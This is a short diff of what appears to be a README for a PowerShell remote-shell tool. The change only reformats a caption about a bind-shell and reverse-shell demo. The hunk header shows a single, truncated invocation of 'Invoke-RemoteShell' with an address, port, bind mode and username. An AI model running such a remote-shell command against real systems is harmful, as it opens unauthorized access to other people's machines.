@@ -45,4 +45,4 @@ Invoke-RemoteShell -Address 192.168.10.14 -Port 1403 -Mode "bind" -Username "dar
 
 ![Example](images/example.png)
 
-    Demonstrate a bind shell at the top, running as the currently logged-in user, and a reverse shell at the bottom, connecting as the user 'dark'.
+Demonstrate a bind shell at the top, running as the currently logged-in user, and a reverse shell at the bottom, connecting as the user 'dark'.
